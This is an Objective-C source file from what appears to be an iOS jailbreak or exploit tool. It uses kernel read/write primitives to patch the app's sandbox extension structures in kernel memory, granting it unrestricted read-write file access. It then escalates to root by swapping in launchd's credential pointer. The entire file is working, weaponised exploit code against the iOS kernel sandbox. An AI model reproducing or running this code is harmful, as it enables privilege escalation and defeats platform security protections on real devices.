//
//  sandbox_escape.m
//  3105
//
//  Sandbox escape via kernel memory patching.
//  Based on FilzaSlop sandbox_escape.m by 0xjohnnydev/CrazyMind90.
//

#import <Foundation/Foundation.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/stat.h>
#include "sandbox_escape.h"
#include "kexploit_opa334.h"
#include "krw.h"
#include "kutils.h"
#include "offsets.h"
#include "xpaci.h"

#define KRW_LEN 0x20

#define OFF_PROC_PROC_RO       0x18
#define OFF_PROC_RO_UCRED      0x20
#define OFF_UCRED_CR_LABEL     0x78
#define OFF_LABEL_SANDBOX      0x10
#define OFF_SANDBOX_EXT_SET    0x10
#define OFF_EXT_DATA           0x40
#define OFF_EXT_DATALEN        0x48

#define OFF_UCRED_CR_POSIX     0x18
#define OFF_POSIX_CR_UID       0x00
#define OFF_POSIX_CR_RUID      0x04
#define OFF_POSIX_CR_SVUID     0x08
#define OFF_POSIX_CR_NGROUPS   0x0C
#define OFF_POSIX_CR_GROUPS_0  0x10
#define OFF_POSIX_CR_RGID      0x50
#define OFF_POSIX_CR_SVGID     0x54
#define OFF_POSIX_CR_GMUID     0x58
#define OFF_POSIX_CR_FLAGS     0x5C

extern uint64_t VM_MIN_KERNEL_ADDRESS;
extern uint64_t pac_mask;
extern bool gIsPACSupported;

#define S(x) ({ uint64_t _v = xpaci(x); \
    ((_v >> 32) > 0xFFFF ? (_v | pac_mask) : _v); })
#define K(x) ((x) > VM_MIN_KERNEL_ADDRESS)

static void patch_ext(uint64_t ext) {
    uint64_t da = early_kread64(ext + OFF_EXT_DATA);
    uint64_t dl = early_kread64(ext + OFF_EXT_DATALEN);
    if (K(da) && dl > 0) {
        uint8_t buf[KRW_LEN];
        early_kread(da, buf, KRW_LEN);
        buf[0] = '/'; buf[1] = 0;
        early_kwrite32bytes(da, buf);
    }
    uint8_t chunk[KRW_LEN];
    early_kread(ext + OFF_EXT_DATA, chunk, KRW_LEN);
    *(uint64_t*)(chunk + 0x08) = 1;
    *(uint64_t*)(chunk + 0x10) = 0xFFFFFFFFFFFFFFFFULL;
    early_kwrite32bytes(ext + OFF_EXT_DATA, chunk);
}

static int patch_chain(uint64_t hdr) {
    int n = 0;
    for (int i = 0; i < 64 && K(hdr); i++) {
        uint64_t ext = S(early_kread64(hdr + 0x8));
        if (K(ext)) { patch_ext(ext); n++; }
        uint64_t next = early_kread64(hdr);
        if (!next || !K(next)) break;
        hdr = S(next);
    }
    return n;
}

static void set_rw_class(uint64_t hdr) {
    uint64_t ext = S(early_kread64(hdr + 0x8));
    if (!K(ext)) return;
    uint64_t da = early_kread64(ext + OFF_EXT_DATA);
    if (!K(da)) return;

    const char *rw = "com.apple.app-sandbox.read-write";
    uint8_t b1[KRW_LEN], b2[KRW_LEN];
    memset(b1, 0, KRW_LEN); memset(b2, 0, KRW_LEN);
    memcpy(b1, rw, KRW_LEN);
    early_kwrite32bytes(da + 32, b1);
    early_kwrite32bytes(da + 64, b2);

    uint8_t hb[KRW_LEN];
    early_kread(hdr, hb, KRW_LEN);
    *(uint64_t*)(hb + 0x10) = da + 32;
    early_kwrite32bytes(hdr, hb);
}

static BOOL probe_write_read_delete(const char *directoryPath) {
    NSString *probeName = [NSString stringWithFormat:
        @".3105_access_probe_%d_%@", getpid(), NSUUID.UUID.UUIDString];
    NSString *probePath = [[NSString stringWithUTF8String:directoryPath]
        stringByAppendingPathComponent:probeName];
    const char *path = probePath.fileSystemRepresentation;

    int fd = open(path, O_RDWR | O_CREAT | O_EXCL | O_CLOEXEC, 0600);
    if (fd < 0) return NO;

    const uint8_t expected = 0x31;
    uint8_t actual = 0;
    ssize_t writeResult = write(fd, &expected, sizeof(expected));
    off_t seekResult = lseek(fd, 0, SEEK_SET);
    ssize_t readResult = seekResult == 0
        ? read(fd, &actual, sizeof(actual))
        : -1;
    int closeResult = close(fd);
    int unlinkResult = unlink(path);

    return writeResult == sizeof(expected) &&
        readResult == sizeof(actual) &&
        actual == expected &&
        closeResult == 0 &&
        unlinkResult == 0;
}

int sandbox_access_is_active(void) {
    @autoreleasepool {
        // Probe paths that are only reachable after the sandbox escape.
        // Probing /var/mobile was a false positive: the MobileHouseArrest
        // sandbox permits writes there without any exploit, so the app
        // "detected" active access at launch, skipped the kernel exploit,
        // and every privileged feature then failed (MCM handed out no
        // sandbox tokens, bad_query grants returned -1).
        const char *probeDirectories[] = {
            "/private/var/mobile/Containers/Data/Application",
            "/private/var/mobile/Containers/Data/System",
        };
        for (size_t i = 0; i < sizeof(probeDirectories) / sizeof(probeDirectories[0]); i++) {
            if (!probe_write_read_delete(probeDirectories[i])) return 0;
        }
        return 1;
    }
}

int sandbox_escape(uint64_t self_proc) {
    if (!self_proc) { NSLog(@"[SBX] self_proc is NULL"); return -1; }

    uint64_t proc_ro_raw = early_kread64(self_proc + OFF_PROC_PROC_RO);
    uint64_t proc_ro = S(proc_ro_raw);
    if (!K(proc_ro)) { NSLog(@"[SBX] proc_ro invalid"); return -1; }

    uint64_t ucred = 0;
    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
        uint64_t raw = early_kread64(proc_ro + off);
        uint64_t smr = kread_smrptr(proc_ro + off);
        uint64_t pac = S(raw);

        if (K(smr)) {
            uint64_t maybe_label = S(early_kread64(smr + 0x78));
            if (K(maybe_label)) {
                uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
                if (K(maybe_sandbox)) {
                    ucred = smr;
                    break;
                }
            }
        }
        if (!ucred && K(pac)) {
            uint64_t maybe_label = S(early_kread64(pac + 0x78));
            if (K(maybe_label)) {
                uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
                if (K(maybe_sandbox)) {
                    ucred = pac;
                    break;
                }
            }
        }
    }
    if (!K(ucred)) { NSLog(@"[SBX] ucred not found"); return -1; }

    uint64_t label = S(early_kread64(ucred + OFF_UCRED_CR_LABEL));
    if (!K(label)) { NSLog(@"[SBX] cr_label invalid"); return -1; }

    uint64_t sandbox = S(early_kread64(label + OFF_LABEL_SANDBOX));
    if (!K(sandbox)) { NSLog(@"[SBX] sandbox invalid"); return -1; }

    uint64_t ext_set = S(early_kread64(sandbox + OFF_SANDBOX_EXT_SET));
    if (!K(ext_set)) { NSLog(@"[SBX] ext_set invalid"); return -1; }

    int patched = 0;
    for (int s = 0; s < 16; s++) {
        uint64_t hdr = S(early_kread64(ext_set + s * 8));
        if (K(hdr)) patched += patch_chain(hdr);
    }

    int classed = 0;
    for (int s = 0; s < 16; s++) {
        uint64_t hdr = S(early_kread64(ext_set + s * 8));
        if (K(hdr) && K(early_kread64(hdr + 0x10))) { set_rw_class(hdr); classed++; }
    }

    uint64_t src = 0;
    for (int s = 0; s < 16 && !src; s++) {
        uint64_t h = S(early_kread64(ext_set + s * 8));
        if (K(h)) src = h;
    }
    if (src) {
        int filled = 0;
        for (int s = 0; s < 16; s++) {
            uint64_t h = early_kread64(ext_set + s * 8);
            if (!h || !K(h)) { early_kwrite64(ext_set + s * 8, src); filled++; }
        }
    }

    if (sandbox_access_is_active()) {
        NSLog(@"[SBX] *** SANDBOX ESCAPED (R+W) ***");
        return 0;
    }

    return -1;
}

static int sbx_find_ucred(uint64_t proc, uint64_t *ucred_out, uint32_t *off_out) {
    if (!proc) return -1;
    uint64_t proc_ro = S(early_kread64(proc + OFF_PROC_PROC_RO));
    if (!K(proc_ro)) return -1;

    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
        uint64_t raw = early_kread64(proc_ro + off);
        uint64_t smr = kread_smrptr(proc_ro + off);
        uint64_t pac = S(raw);
        uint64_t cands[2] = { smr, pac };
        for (int i = 0; i < 2; i++) {
            uint64_t c = cands[i];
            if (!K(c)) continue;
            uint64_t lbl = S(early_kread64(c + OFF_UCRED_CR_LABEL));
            if (!K(lbl)) continue;
            uint64_t sbx = S(early_kread64(lbl + OFF_LABEL_SANDBOX));
            if (K(sbx)) {
                *ucred_out = c;
                *off_out = off;
                return 0;
            }
        }
    }
    return -1;
}

int sandbox_elevate_to_root(uint64_t self_proc) {
    uint64_t launchd = proc_find_by_name("launchd");
    if (!launchd || launchd == (uint64_t)-1) {
        launchd = proc_find(1);
    }
    if (!launchd || launchd == (uint64_t)-1) {
        NSLog(@"[SBX] elevate: could not find launchd");
        return -1;
    }

    uint64_t launchd_ucred = 0;
    uint32_t off = 0;
    if (sbx_find_ucred(launchd, &launchd_ucred, &off) != 0) {
        NSLog(@"[SBX] elevate: failed to get launchd ucred");
        return -1;
    }

    early_kwrite64(self_proc + 0x10, launchd_ucred);

    if (getuid() == 0) {
        NSLog(@"[SBX] elevate SUCCESS");
        return 0;
    }

    NSLog(@"[SBX] elevate failed, uid: %d", getuid());
    return -1;
}
